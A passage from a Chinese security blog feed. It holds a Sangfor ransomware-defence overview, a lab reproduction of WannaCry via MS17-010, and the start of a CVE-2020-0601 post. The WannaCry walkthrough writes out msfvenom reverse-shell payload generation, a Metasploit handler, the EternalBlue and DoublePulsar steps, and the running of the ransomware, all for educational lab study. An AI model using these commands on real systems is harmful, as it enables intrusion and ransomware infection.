    <content type="html"><![CDATA[<p>这篇文章来自深信服的《外部威胁防护和勒索病毒对抗》，对知名安全厂商的威胁防护措施有个基本了解，包括网络安全面临的挑战、如何有效应对挑战、深信服安全建设之道等等。</p><span id="more"></span><h1 id="1-网络安全面临的挑战"><a href="#1-网络安全面临的挑战" class="headerlink" title="1. 网络安全面临的挑战"></a>1. 网络安全面临的挑战</h1><p>现在市面上各种勒索病毒、利用服务器资源进行比特币挖矿的病毒、数据库脱库越来越多。那么这些外部威胁如何防护呢？</p><p>首先，介绍几个典型的网络安全事件，包括平昌冬奥会开幕式网站被攻击、中国企业被美俄两国黑客攻击、台积电遭到勒索病毒攻击等等。同时，看到了医疗行业被勒索、思科设备存在高危漏洞、国际黑客攻击我国的系统。</p><p>安全事件频发的今天，我们从中分析为什么会出现这样的状况呢？下图展示了安全事件的演变流程。</p><img src="/posts/11f48b75/1.1.1.png" class="" title="安全事件的演变流程"><ul><li>早期90年代(恶意代码)：国内90年代爆发的是僵尸网络、木马、蠕虫，包括熊猫烧香这种病毒在网络中不断扩散。早期是以恶意代码的方式进行的网络攻击，通过简单IP端口、协议、通信机制等网络要素就能隔离传播途径。</li><li>互联网时代(应用层威胁)：2000年之后进入互联网时代，基于Web的B/S架构的开发越来越多，该阶段衍生出很多面向应用层的高级别威胁，比如通过邮件附件、文件、社交媒体等带来大量病毒入侵企业。此时，仅仅通过IP端口和协议不再适用，如果不能检查其内容会有很多潜藏的病毒，安全事件逐渐向高层次发展。</li><li>棱镜门事件(高级可持续)：国内比较重视安全是2013年棱镜门事件爆发之后，美国很多年前就开启了监控计划，棱镜门是把它暴露到全世界的视角下，我国也做了很多安全措施，包括赛门铁克撤出、政府采购等。国家武器库在该时期也走进了全世界视角，包括利用永恒之蓝、0day漏洞去攻击我们的核心系统等，也会看到高级可持续威胁，包括社会工程的变化。</li></ul><p>利益驱动网络空间威胁不断进化，攻防态势已从已知威胁的防御，升级到未知威胁甚至高级威胁的对抗。网络攻击融合了隐蔽通道、病毒变种、攻击混淆等技术。</p><p>接着看看企业安全建设的情况，安全问题主要包括两方面：</p><ul><li>安全暴露面多：现在外部威胁和攻击手法越来越多，包括扫描渗透、邮件传播、社会工程、高危漏洞、恶意软件、0day漏洞、U盘传播等。同时，为了对外提供更加精准的服务和营销，业务和数据变得越来越集中，业务开放之后安全暴露面也不断扩大，会产生更大的安全风险。</li><li>被动响应式防御：企业面临的现状是安全人员并不一定能够把当前攻防趋势研究透彻，安全人员会维护各种各样的安全设备，比如Web安全、数据库安全、终端安全等，海量日志充满了噪声，只能通过被动响应式的威胁防御。</li></ul><p>随之而来的是企业的安全运营工作开展困难，包括统一运营能力缺失、洞悉风险能力缺失、快速响应能力缺失等。当前很多企业并没有这种设备统一管理以及日志统一分析能力，不能有效地聚合成一个安全事件，从而错过最佳的营救时间。</p><h1 id="2-如何有效应对挑战"><a href="#2-如何有效应对挑战" class="headerlink" title="2. 如何有效应对挑战"></a>2. 如何有效应对挑战</h1><p>针对上述问题，当前客户面临的安全问题从外至内如下图所示，其中大部分问题都来自于网络和端点，故分为网络安全问题和终端安全问题。包括：</p><img src="/posts/11f48b75/2.1.1.png" class="" title="当前客户面临的安全问题"><p>深信服提出了如下的建设思路：</p><h2 id="2-1-安全需要纵深保护"><a href="#2-1-安全需要纵深保护" class="headerlink" title="2.1 安全需要纵深保护"></a>2.1 安全需要纵深保护</h2><p>加强安全基础性保障建设，通过设备间协同联动在防御机制上形成合力，包括网络保护、终端安全、协同联动。你可能会疑惑，企业购买了防火墙是不是就意味着安全了呢？其实安装了防火墙只是做了访问控制，买了终端只是做了静态的病毒库，而且更新不具备时效性，这种情况应对现在变化的网络很难有效，所以提出了协同联动的机制，网络和终端通过信息共享、威胁情报互换，从而二次校验威胁。</p><p>以勒索病毒为例，为什么传统的防护方案总是失效呢？</p><img src="/posts/11f48b75/2.1.2.png" class="" title="安全需要纵深保护"><ul><li><p>第一步，外网到内网的传播</p><p>首先在攻击手段上就有多种方式，包括钓鱼邮件、水坑站点、捆绑下载等。</p></li><li><p>第二步，安装与C&amp;C通信</p><p>当勒索病毒在我们的服务器爆发之后，它通常都会和互联网的主控台建立反向连接，称为C&amp;C互联，接着互联网主控台就会下发一些恶意指令，比如加密文件、回传信息、病毒特征掩饰等。</p></li><li><p>第三步，漏洞利用提权/加密勒索</p><p>程序开始在系统中释放，包括很多操作系统提权操作、代码混淆等。</p></li><li><p>第四步，横向持续扩散</p><p>接着横向传播感染更多的服务器，包括RDP爆破、蠕虫式传播等。</p></li></ul><p>所以传统防火墙如果只是做了业务层的访问控制，杀毒仅覆盖已知的病毒库，那么很可能方案是失效的。</p><h2 id="2-2-安全需要快速处置"><a href="#2-2-安全需要快速处置" class="headerlink" title="2.2 安全需要快速处置"></a>2.2 安全需要快速处置</h2><p>第二个主要是安全管理的能力，包括攻击时间、停留时间、响应时间等检测。从扫描入侵开始，如果设备安全能力足够，越早发现越好。同时，从识别到响应也需要一定的时间，比如样本提取、样本分析等。威胁清除方法包括：登录防火墙查看安全日志、判断威胁等级及严重性、定位疑似IP及电话询问用户、病毒扫描及定位威胁和事件。如何更好、更快地检测威胁尤为重要。</p><img src="/posts/11f48b75/2.2.1.png" class="" title="安全需要快速处置"><h2 id="2-3-安全需要能力不断升级，对抗APT风险"><a href="#2-3-安全需要能力不断升级，对抗APT风险" class="headerlink" title="2.3 安全需要能力不断升级，对抗APT风险"></a>2.3 安全需要能力不断升级，对抗APT风险</h2><p>虽然网络设备和端点设备非常依赖样本特征，但如何保障企业现有投资应对未来未知的威胁也非常重要。基于大数据提供动态变化的威胁情报，应用多种创新技术手段加强抵御外部不断变化的高级威胁，包括预测、防御、响应和检测。</p><p>举个例子，我本地看到一个IP，不知道是好是坏，但是我把这个IP传到云端，云端通过庞大的威胁校验机制判断该IP来自哪个国家、曾经攻击过哪些企业、IP关联的黑客家族、文件样本等。云端把IP信息告诉本地设备，从而确定该IP有害并加入黑名单，通过本地设备和云端实时互联，提高威胁情报检测能力，也是当前业界比较热门的方向。</p><p>当然威胁情报提炼会有各种技术，包括人工智能技术、流量分析技术、僵尸网络检测引擎等，最终企业面对勒索病毒、挖矿病毒、0day漏洞等高危攻击，可以持续利用云端大数据情报进行应对。</p><h1 id="3-深信服安全建设之道"><a href="#3-深信服安全建设之道" class="headerlink" title="3. 深信服安全建设之道"></a>3. 深信服安全建设之道</h1><p>具体的建设过程提出了“网络+终端+云端”的体系化建设思路。通过网络终端实现纵深保护，云端和本地结合可视化展现风险及快速处置，并升级能力进行有效防护。日志可以统一发送给云端平台，云端再进行日志分析洞悉威胁，定位位置并给出处理建议。</p><img src="/posts/11f48b75/3.1.1.png" class="" title="深信服安全建设之道"><p>下图展示了网、端、云如何保障安全的框架，整个统一安全能力中心包括设备管理、数据分析和威胁处置，结合端点和网络进行双向溯源、智能联动的安全保护，具体能力涉及：</p><ul><li>安全规则更新</li><li>全球威胁情报查询</li><li>勒索病毒响应</li><li>云端沙箱监测分析</li></ul><img src="/posts/11f48b75/3.1.2.png" class="" title="深信服安全建设之道"><h2 id="3-1-网的保护"><a href="#3-1-网的保护" class="headerlink" title="3.1 网的保护"></a>3.1 网的保护</h2><p>使用下一代防火墙进行网的保护（L2-L7层网络风险全面防御），具体内容包括：</p><ul><li>响应：联动EDR清除终端病毒、联动封锁攻击源</li><li>检测：黑链检测、Webshell后门检测、失陷主机检测</li><li>防御：Web应用防护、入侵防御模块IPS、SAVE防病毒引擎、URL过滤及应用特征识别、ARP欺骗防御及DDoS防御</li><li>预防：误配置、弱口令、漏洞检查、资产梳理、端口开放检查</li></ul><p>优势如下：</p><ol><li><p>基于人工智能的网络防病毒能力</p><p>通过人工智能有监督学习、无监督学习自动化地监控病毒的微小变化，包括主流及热点病毒防御、人工智能算法抵御未知病毒、不依赖特征更新和资源占用小。</p></li><li><p>全面的Web防御能力</p><p>针对Webshell、网页木马、目录遍历、SQL注入、XSS攻击、跨站请求伪造等各种攻击防御，从而防止企业数据泄露、网页篡改、行政处罚、信誉受损。之前的检测方法是在SQL语句中寻找静态特征，但会存在很多误判或漏判的情况，目前采用基于语法词法分析的算法，从代码的执行含义层面进行分析，从而进行精确判断。</p><img src="/posts/11f48b75/3.1.3.png" class="" title="网的保护"></li><li><p>失陷主机的全面检测</p><p>服务器在部署防火墙之前，可能有病毒潜伏了很多年，定期偷改数据。如果能网络侧构建一个反方向的连接流量，由于所有执行指令都需要跟外部主控台做连接，如果能在防火墙或流量侧捕获到这种恶意连接，就表示成功了。</p></li></ol><p>勒索病毒中招不是最可怕的，最可怕的是它会不断高频回联，定期偷数据或进行恶意指令加密服务器的文档。我们可以基于连接的频率、连接的时段进行检测，比如夜间突然连接频率增大，并且连接国外的服务器，此时就表示主机已经失陷，需要在网络侧定义很多域名，告诉终端产品并找到异常进程，最终杀掉该进程即可防御。基于网络流量分析及智能算法，持续检测网络异常风险。</p><img src="/posts/11f48b75/3.1.4.png" class="" title="网的保护"><h2 id="3-2-端的保护"><a href="#3-2-端的保护" class="headerlink" title="3.2 端的保护"></a>3.2 端的保护</h2><p>智能检测提供全面的终端保护，具体内容包括：</p><ul><li>响应：文件修复、一键隔离风险、溯源分析</li><li>检测：病毒全局抑制机制、文件实时监控及主动扫描</li><li>防御：恶意程序诱捕及病毒防扩散、勒索及挖矿变种防护、常规及高危病毒防护、东西向微隔离（主机访问控制）</li><li>预防：补丁管理及基线检查</li></ul><p>优势如下：</p><ol><li><p>全面的终端病毒防御能力</p><p>评价一款杀毒软件的好坏主要包括两个指标——病毒检出率、病毒误报率。深信服人工智能杀毒引擎SAVE创新人工智能无特征技术，能准确检测未知病毒，并且其代码执行的病毒检出率较高。</p></li><li><p>东西向微隔离动态防御技术</p><p>病毒和蠕虫通常会传播感染，而东西向访问控制，可以基于主机间访问控制进行主机隔离。</p><img src="/posts/11f48b75/3.2.1.png" class="" title="端的保护"></li><li><p>病毒诱捕及全局抑制</p><p>这是另一个创新，会在操作系统的关键路径放置一些伪造的疑似样本，如果鱼钩文件被加密，就认为勒索病毒上钩，把加密的进程特征进行提取，并告知终端管理平台，从而向EDR终端客户端传达，只要发现具有该特征的样本就是勒索病毒。实现单点检测和全局抑制。</p><img src="/posts/11f48b75/3.2.2.png" class="" title="端的保护"></li></ol><h2 id="3-3-云的赋能"><a href="#3-3-云的赋能" class="headerlink" title="3.3 云的赋能"></a>3.3 云的赋能</h2><p>云端产品具有网端安全赋能、智能安全运营，具体内容如下：</p><ul><li>能力实时更新：安全规则更新、云端沙箱检测、全球情报联动、动态引擎更新、动态实时赋能</li><li>智能安全运营：统一运维管理、微信告警闭环、统一分析展示、专家在线分析、网端日志聚合</li></ul><p>优势如下：</p><ol><li><p>统一分析与展示信息</p><p>在运营侧，会统一分析与展示信息，安全专家和设备都会做相关的分析。架构如下图所示：</p><img src="/posts/11f48b75/3.3.1.png" class="" title="云的赋能"><p>具体效果如下图所示，包括核心资产、安全概括、外部攻击等。</p><img src="/posts/11f48b75/3.3.2.png" class="" title="云的赋能"></li><li><p>网端云协同举证、一键处置、智能免疫，简化安全运营</p><p>以勒索病毒为例，服务器会计算夜间外联多少次，以及手段、模式和IP来自的国家；网络侧会定位域名，推送给终端，终端关联发起域名进程的文件，接着进行反向追溯。</p><p>云端大数据会鉴别疑似有害的域名、进程，从而构建风险标签，比如某个进程对应的可能是木马。</p><p>最后进行一键查杀，保证企业安全。</p></li><li><p>风险快速处置闭环</p><p>由于安全人员不会实时监控系统，对于安全事件，我们会和微信端或APP结合，快速处置风险。</p><img src="/posts/11f48b75/3.3.3.png" class="" title="云的赋能"></li><li><p>统一运维管理</p><p>包括设备管理大屏幕、智能监控、智能告警、报表分析、远程接入等。</p><img src="/posts/11f48b75/3.3.4.png" class="" title="云的赋能"><img src="/posts/11f48b75/3.3.5.png" class="" title="云的赋能"></li><li><p>动态实时赋能</p><p>依赖各种社区和平台进行未知威胁动态监测，安全规则更新，包括融合Virustotal、火绒安全、CNVD、瑞星等安全厂商的情报。</p><p>与传统对抗手段的效果对比如下图所示：</p><img src="/posts/11f48b75/3.3.6.png" class="" title="云的赋能"></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章来自深信服的《外部威胁防护和勒索病毒对抗》，对知名安全厂商的威胁防护措施有个基本了解，包括网络安全面临的挑战、如何有效应对挑战、深信服安全建设之道等等。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="系统安全" scheme="http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WannaCry勒索病毒分析之利用MS17-010漏洞实现勒索加密</title>
    <link href="http://example.com/posts/9784e9fe.html"/>
    <id>http://example.com/posts/9784e9fe.html</id>
    <published>2022-07-11T10:20:52.864Z</published>
    <updated>2022-07-16T02:16:08.609Z</updated>
    
    <content type="html"><![CDATA[<p>WannaCry复现过程十分繁琐，仅推荐大家理解漏洞利用的基本过程。这里使用了两种复现方法，一种是Python构建shellcode代码攻击，以及双星脉冲漏洞、DLL文件的设置与后续逆向分析均有关，另一种是我们常用的MSF。</p><span id="more"></span><p>下图是安天分析WannaRen勒索软件的攻击流程，其名称和功能与WannaCry相似。</p><img src="/posts/9784e9fe/1.1.1.png" class="" title="勒索病毒攻击过程"><h1 id="1-WannaCry背景"><a href="#1-WannaCry背景" class="headerlink" title="1. WannaCry背景"></a>1. WannaCry背景</h1><p>2017年5月12日，WannaCry蠕虫通过永恒之蓝MS17-010漏洞在全球范围大爆发，感染大量的计算机。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已影响金融、能源、医疗、教育等众多行业，造成严重的危害。</p><p>WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。</p><p>WannaCry利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。</p><img src="/posts/9784e9fe/1.1.2.png" class="" title="勒索病毒"><p>WannaCry利用永恒之蓝漏洞进行网络端口扫描攻击，目标机器被成功攻陷后会从攻击机下载WannaCry蠕虫进行感染，并作为攻击机再次扫描互联网和局域网的其它机器，形成蠕虫感染大范围超快速扩散。</p><p>木马母体为<code>mssecsvc.exe</code>，运行后会扫描随机IP的互联网机器，尝试感染，也会扫描局域网相同网段的机器进行感染传播，此外会释放敲诈者程序<code>tasksche.exe</code>，对磁盘文件进行加密勒索。</p><p>木马加密使用AES加密文件，并使用非对称加密算法RSA 2048加密随机密钥，每个文件使用一个随机密钥，理论上不可攻破。同时<code>@WanaDecryptor@.exe</code>显示勒索界面。其核心流程如下图所示：</p><img src="/posts/9784e9fe/1.1.3.jpg" class="" title="勒索病毒核心流程"><p>WannaCry勒索病毒主要行为是传播和勒索：</p><ul><li>传播：利用基于445端口的SMB漏洞MS17-010(永恒之蓝)进行传播</li><li>勒索：释放文件，包括加密器、解密器、说明文件、语言文件等；内存加载加密模块，加密执行类型文件，全部加密后启动解密器；解密器启动后，设置桌面背景显示勒索信息，弹窗窗口显示付款账号和勒索信息</li></ul><h1 id="2-实验环境搭建"><a href="#2-实验环境搭建" class="headerlink" title="2. 实验环境搭建"></a>2. 实验环境搭建</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机1：Kali Linux x64（IP地址：192.168.193.128）</p><p>攻击机2：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p><p>靶机：Windows 7 x64（IP地址：192.168.193.141）</p><p><strong>保证攻击机1、攻击机2与靶机能两两通讯，均在同一局域网中。</strong></p><h2 id="2-2-实验工具"><a href="#2-2-实验工具" class="headerlink" title="2.2 实验工具"></a>2.2 实验工具</h2><ul><li>Python v2.6</li><li>Python32-221.win32-py2.6</li><li>Shadowbroker-master(<a href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a>)</li><li>Wcry.exe</li></ul><h2 id="2-3-实验步骤"><a href="#2-3-实验步骤" class="headerlink" title="2.3 实验步骤"></a>2.3 实验步骤</h2><ol><li>配置Windows Server 2003、Kali、Windows 7实验环境</li><li>Kali检测受害主机445端口(SMB协议)是否开启</li><li>运行永恒之蓝Python脚本</li><li>利用DLL后门文件进行Doublepulsar注入</li><li>Metaploit获取受害主机的shell</li><li>运行<code>Wcry.exe</code>母体程序，实现勒索和文件加密</li></ol><h1 id="3-Python复现"><a href="#3-Python复现" class="headerlink" title="3. Python复现"></a>3. Python复现</h1><p><strong>实验复现过程必须在虚拟机中完成，运行之前关闭虚拟机Win 7的文件共享。</strong></p><h2 id="3-1-实验准备"><a href="#3-1-实验准备" class="headerlink" title="3.1 实验准备"></a>3.1 实验准备</h2><p>关闭Win 7虚拟机的文件共享，开启445端口，同时关闭防火墙。</p><img src="/posts/9784e9fe/3.1.1.png" class="" title="关闭文件共享"><img src="/posts/9784e9fe/3.1.2.png" class="" title="开启445端口"><img src="/posts/9784e9fe/3.1.3.png" class="" title="开启445端口"><p>在Windows Server 2003系统中配置Python环境。</p><ul><li><a href="https://www.python.org/download/releases/2.6/">Python 2.6</a></li><li><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">Python32-221.win32-py2.6</a></li><li><a href="https://github.com/misterch0c/shadowbroker">Shadowbroker工具包</a></li></ul><img src="/posts/9784e9fe/3.1.4.png" class="" title="配置环境变量"><img src="/posts/9784e9fe/3.1.5.png" class="" title="配置Python环境"><img src="/posts/9784e9fe/3.1.6.png" class="" title="配置Python环境"><p>下载shadowbroker工具包，在windows文件夹中新建文件夹<code>logs</code>和<code>listeningposts</code>，用记事本打开windows文件夹中的<code>Fuzzbunch.xml</code>文件，并修改<code>ResourcesDir</code>和<code>LogDir</code>的路径为：C:\shadowbroker\windows\Resources和logs。注意，目录名不能有空格。</p><img src="/posts/9784e9fe/3.1.7.png" class="" title="新建文件夹和修改路径"><h2 id="3-2-实验过程"><a href="#3-2-实验过程" class="headerlink" title="3.2 实验过程"></a>3.2 实验过程</h2><h3 id="3-2-1-提权"><a href="#3-2-1-提权" class="headerlink" title="3.2.1 提权"></a>3.2.1 提权</h3><p>用Kali扫描靶机是否开启445端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.193.141</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.2.1.png" class="" title="445端口"><p>使用msfvenom工具生成后门文件<code>abc.dll</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.193.128 LPORT=6666 -f dll &gt; abc.dll</span><br></pre></td></tr></table></figure><p>其中，-p指定使用模块类型，-f指定文件类型。</p><img src="/posts/9784e9fe/3.2.2.png" class="" title="生成后门文件"><p>将<code>abc.dll</code>上传到Windows Server 2003中。</p><img src="/posts/9784e9fe/3.2.3.png" class="" title="abc.dll"><p>在Windows Server 2003运行永恒之蓝工具，若出现以下界面则工具安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python C:\shadowbroker\windows\fb.py</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.1.8.png" class="" title="安装永恒之蓝工具"><p>设置靶机IP、攻击机1的IP(反弹shell地址)、重定向以及新建项目名称等。重定向一定选no。其他选项默认，Enter即可。</p><img src="/posts/9784e9fe/3.2.4.png" class="" title="设置参数"><p>加载永恒之蓝模块，获取受害主机的系统权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use Eternalblue</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.2.5.png" class="" title="设置参数"><p>设置受害主机操作系统Win 7 x64，设置模式FB，该模式下进行交互性参数输入。</p><img src="/posts/9784e9fe/3.2.6.png" class="" title="设置参数"><img src="/posts/9784e9fe/3.2.7.png" class="" title="设置参数"><p>当看到WIN和Eternalblue Succeeded信息，表示受害主机的权限获取成功。</p><img src="/posts/9784e9fe/3.2.8.png" class="" title="设置参数"><p>接着设置Kali系统，通过Metasploit等待返回的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole#加载msf框架</span><br><span class="line">use exploit/multi/handler#使用handler操作</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp#设置payload</span><br><span class="line">set LHOST 192.168.193.128#设置本地IP</span><br><span class="line">set LPORT 6666#设置本地端口</span><br><span class="line">run#开启监听</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.2.9.png" class="" title="监听本地端口"><p>在Windows Server 2003中进行Doublepulsar注入(双倍脉冲)，具体流程如下：</p><p>输入<code>use Doublepulsar</code>加载双倍脉冲注入。设置相关参数，包括选择SMB协议，后门利用方法为RunDLL。</p><img src="/posts/9784e9fe/3.2.10.png" class="" title="设置参数"><img src="/posts/9784e9fe/3.2.11.png" class="" title="设置参数"><img src="/posts/9784e9fe/3.2.12.png" class="" title="设置参数"><p>回到Kali查看meterpreter，此时成功获取受害主机的shell。</p><img src="/posts/9784e9fe/3.2.13.png" class="" title="反弹shell"><h3 id="3-2-2-上传勒索病毒"><a href="#3-2-2-上传勒索病毒" class="headerlink" title="3.2.2 上传勒索病毒"></a>3.2.2 上传勒索病毒</h3><p>获得权限后，将勒索病毒<code>wcry.exe</code>上传至受害主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/v5le0n9/Desktop/wcry2.0/wcry.exe c:\\</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.2.16.png" class="" title="上传勒索病毒"><p>获取受害主机的shell，如果出现中文乱码输入<code>chcp 65001</code>设置编码，接着运行<code>wcry.exe</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001</span><br><span class="line">wcry.exe</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/3.2.17.png" class="" title="运行勒索病毒"><p>运行病毒程序后的界面如下图所示，已经成功被勒索。</p><img src="/posts/9784e9fe/3.2.18.png" class="" title="勒索病毒"><p>加密系统中的文件，被加密的文件后缀名统一修改为<code>.WNRY</code>。</p><ul><li>b.wnry：中招后的桌面壁纸</li><li>c.wnry：配置文件，包含洋葱域名、比特币地址、tor下载地址等</li><li>f.wnry：可免支付解密的文件列表</li><li>r.wnry：提示文件，包含中招提示信息</li><li>s.wnry：zip文件，包含tor客户端</li><li>t.wnry：测试文件</li><li>u.wnry：解密程序</li></ul><img src="/posts/9784e9fe/3.2.14.png" class="" title="程序加密后"><img src="/posts/9784e9fe/3.2.15.png" class="" title="提示信息"><p>上一篇文章是利用Python复现永恒之蓝漏洞，过程较为复杂，所以这篇文章将直接利用MSF复现MS17-010漏洞进行反弹shell，再上传勒索病毒进行复现，并详细讲解WannaCry勒索病毒的原理。</p><!--more--><h1 id="4-MSF复现"><a href="#4-MSF复现" class="headerlink" title="4. MSF复现"></a>4. MSF复现</h1><h2 id="4-1-环境配置"><a href="#4-1-环境配置" class="headerlink" title="4.1 环境配置"></a>4.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.145）</p><p>靶机：Windows 7 x64（IP地址：192.168.193.141）</p><p>利用工具：MSF</p><h2 id="4-2-复现准备"><a href="#4-2-复现准备" class="headerlink" title="4.2 复现准备"></a>4.2 复现准备</h2><p>开启Win 7的445端口，同时关闭防火墙。注意，关闭虚拟机文件共享功能，否则后面上传的勒索病毒会通过局域网传播到物理机与其它虚拟机。</p><p>保证攻击机和靶机能够相互通讯，均在同一个局域网中。</p><h2 id="4-3-复现过程"><a href="#4-3-复现过程" class="headerlink" title="4.3 复现过程"></a>4.3 复现过程</h2><p>用Kali扫描靶机是否开启了445端口。</p><img src="/posts/9784e9fe/1.3.1.png" class="" title="445端口是否开启"><p>打开msfconsole并查询MS17-010漏洞模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p>由于靶机是我们自定义的，所以可以确定靶机的确存在MS17-010漏洞，进而省去利用辅助模块探测靶机是否存在该漏洞，直接利用漏洞利用模块提权。</p><img src="/posts/9784e9fe/1.3.2.png" class="" title="查找MS17-010漏洞相关模块信息"><p>利用永恒之蓝漏洞并设置参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">set LHOST 192.168.193.145</span><br><span class="line">set RHOST 192.168.193.141</span><br><span class="line">set RPORT 445</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/9784e9fe/1.3.3.png" class="" title="MS17-010漏洞利用"><img src="/posts/9784e9fe/1.3.4.png" class="" title="MS17-010漏洞利用"><p>此时，成功提取靶机权限。之后再进行上传勒索病毒操作。</p><h1 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h1><p>勒索软件常见防御措施如下：</p><ul><li>开启系统防火墙</li><li>关闭445、139等端口连接</li><li>开启系统自动更新，下载并更新补丁，及时修复漏洞</li><li>安装安全软件，开启主动防御进行拦截查杀</li><li>如非服务需要，建议把高危漏洞的端口都关闭，比如138、139、445、3389等</li></ul><p>由于WannaCry勒索病毒主要通过445端口入侵计算机，关闭方法可在Windows防火墙中添加入站规则，禁止通过445端口连接。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;WannaCry复现过程十分繁琐，仅推荐大家理解漏洞利用的基本过程。这里使用了两种复现方法，一种是Python构建shellcode代码攻击，以及双星脉冲漏洞、DLL文件的设置与后续逆向分析均有关，另一种是我们常用的MSF。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0601漏洞复现及防御机制</title>
    <link href="http://example.com/posts/2ae8b8b2.html"/>
    <id>http://example.com/posts/2ae8b8b2.html</id>
    <published>2022-07-07T05:48:31.201Z</published>
    <updated>2022-07-08T15:44:54.074Z</updated>
    
    <content type="html"><![CDATA[<p>基于<a href="https://v5le0n9.github.io/posts/8fb0b0f6.html">PE数字签名</a>，微软证书漏洞(CVE-2020-0601)在实现椭圆曲线加密(ECC)算法数字证书验证时产生，位于<code>CryptoAPI.dll</code>文件。可被利用与伪造来组可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力。</p><span id="more"></span><h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>CVE-2020-0601漏洞位于窗口的加密组件CryptoAPI中。 CryptoAPI是微软提供给开发者的Windows安全服务APP接口，可以用于加密的APP应用，实现数据的加密、解密、签名、验证等功能。</p><p>可能影响信任的一些实例包括：</p><ul><li>HTTPS连接</li><li>文件签名</li><li>电子邮件签名</li><li>以用户模式启动的签名可执行程序</li></ul><p>此外，该漏洞可以让攻击者伪造代码签名证书对恶意可执行文件进行签名，使文件看似来自可信来源。例如，可以让勒索软件或其它间谍软件拥有看似有效的证书，从而促使用户安装。中间人攻击并解密用户连接到受影响软件的机密信息也是主要的攻击场景之一。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>由<code>Crypt32.dll</code>提供的微软Windows CryptoAPI无法正确验证ECC证书的信任链。 攻击者可以利用这个漏洞伪造可信的根证书并颁发证书。 <code>Crypt32.dll</code>的<code>CertGetCertifiCAteChain()</code>函数用于验证X.509的合法性，并跟踪受信任的根CA颁发的证书。 由于函数存在漏洞，无法正确验证包含第三方非微软根证书的证书。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>目前，支持使用带有指定参数的ECC密钥的证书的Microsoft Windows版本会受到影响，包括：</p><ul><li>Windows 10</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>依赖于Windows CryptoAPI的应用程序</li></ul><p>由于Windows 7、Windows Server 2008 R2没有默认添加微软的ECC根证书，<code>crypt32.dll</code>里也没有这个hash值，不能直接对比通过，故不受影响。</p><h1 id="2-前置知识"><a 